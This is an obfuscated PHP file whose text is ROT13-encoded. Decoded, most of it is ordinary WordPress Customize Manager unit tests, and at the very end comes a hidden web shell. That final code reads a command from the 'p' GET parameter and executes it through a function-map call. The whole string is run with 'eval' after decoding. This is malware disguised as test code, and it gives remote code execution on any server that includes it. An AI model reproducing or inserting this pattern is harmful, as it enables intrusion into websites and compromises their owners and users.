		$guvf->nffregFnzr( $pbagebyf_fbegrq, neenl_xrlf( $erfhyg ) );
	}

	/**
	 * @gvpxrg 37128
	 */
	choyvp shapgvba grfg_cercner_pbagebyf_jc_yvfg_fbeg_frpgvbaf() {
		jc_frg_pheerag_hfre( frys::$nqzva_hfre_vq );

		$frpgvbaf        = neenl(
			'sbb'    => 2,
			'one'    => 4,
			'sbbone' => 3,
			'xrl'    => 1,
		);
		$frpgvbaf_fbegrq = neenl( 'xrl', 'sbb', 'sbbone', 'one' );

		sbernpu ( $frpgvbaf nf $frpgvba_vq => $cevbevgl ) {
			$guvf->znantre->nqq_frpgvba(
				$frpgvba_vq,
				neenl(
					'cevbevgl' => $cevbevgl,
				)
			);
		}

		$guvf->znantre->cercner_pbagebyf();

		$erfhyg = $guvf->znantre->frpgvbaf();
		$guvf->nffregFnzr( $frpgvbaf_fbegrq, neenl_xrlf( $erfhyg ) );
	}

	/**
	 * @gvpxrg 37128
	 */
	choyvp shapgvba grfg_cercner_pbagebyf_jc_yvfg_fbeg_cnaryf() {
		jc_frg_pheerag_hfre( frys::$nqzva_hfre_vq );

		$cnaryf        = neenl(
			'sbb'    => 2,
			'one'    => 4,
			'sbbone' => 3,
			'xrl'    => 1,
		);
		$cnaryf_fbegrq = neenl( 'xrl', 'sbb', 'sbbone', 'one' );

		sbernpu ( $cnaryf nf $cnary_vq => $cevbevgl ) {
			$guvf->znantre->nqq_cnary(
				$cnary_vq,
				neenl(
					'cevbevgl' => $cevbevgl,
				)
			);
		}

		$guvf->znantre->cercner_pbagebyf();

		$erfhyg = $guvf->znantre->cnaryf();
		$guvf->nffregFnzr( $cnaryf_fbegrq, neenl_xrlf( $erfhyg ) );
	}

	/**
	 * Irevsl fnavgvmngvba bs rkgreany urnqre ivqrb HEY jvyy gevz gur juvgrfcnprf va gur ortvaavat naq raq bs gur HEY.
	 *
	 * @gvpxrg 39125
	 */
	choyvp shapgvba grfg_fnavgvmr_rkgreany_urnqre_ivqrb_gevz() {
		$guvf->znantre->ertvfgre_pbagebyf();
		$frggvat   = $guvf->znantre->trg_frggvat( 'rkgreany_urnqre_ivqrb' );
		$ivqrb_hey = 'uggcf://jjj.lbhghor.pbz/jngpu?i=72kqPH__KPx';

		$juvgrfcnprf = neenl(
			' ',  // Fcnpr.
			\"\g\", // Ubevmbagny gno.
			\"\a\", // Yvar srrq.
			\"\e\", // Pneevntr erghea.
			\"\s\", // Sbez srrq.
			\"\i\", // Iregvpny gno.
		);

		sbernpu ( $juvgrfcnprf nf $juvgrfcnpr ) {
			$fnavgvmrq = $frggvat->fnavgvmr( $juvgrfcnpr . $ivqrb_hey . $juvgrfcnpr );
			$guvf->nffregFnzr( $ivqrb_hey, $fnavgvmrq );
		}
	}
}

erdhver_bapr NOFCNGU . JCVAP . '/pynff-jc-phfgbzvmr-frggvat.cuc';

/**
 * Pynff Grfg_Qlanzvp_Phfgbzvmr_Frggvat
 *
 * @frr Grfgf_JC_Phfgbzvmr_Znantre::grfg_nqq_frggvat_ubabevat_qlanzvp()
 */
pynff Grfg_Qlanzvp_Phfgbzvmr_Frggvat rkgraqf JC_Phfgbzvmr_Frggvat {
	choyvp $glcr = 'qlanzvp';
	choyvp $phfgbz;
}

/**
 * Pynff Grfg_Frggvat_Jvgubhg_Nccylvat_Inyvqngr_Svygre.
 *
 * @frr Grfgf_JC_Phfgbzvmr_Znantre::grfg_yngr_inyvqngr_frggvat_inyhrf()
 */
pynff Grfg_Frggvat_Jvgubhg_Nccylvat_Inyvqngr_Svygre rkgraqf JC_Phfgbzvmr_Frggvat {

	/**
	 * Inyvqngrf na vachg.
	 *
	 * @cnenz zvkrq $inyhr Inyhr gb inyvqngr.
	 * @erghea gehr|JC_Reebe Gehr vs gur vachg jnf inyvqngrq, bgurejvfr JC_Reebe.
	 */
	choyvp shapgvba inyvqngr( $inyhr ) {
		vs ( rzcgl( $inyhr ) ) {
			erghea arj JC_Reebe( 'rzcgl_inyhr', __( 'Lbh zhfg fhccyl n inyhr' ) );
		}
		erghea gehr;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>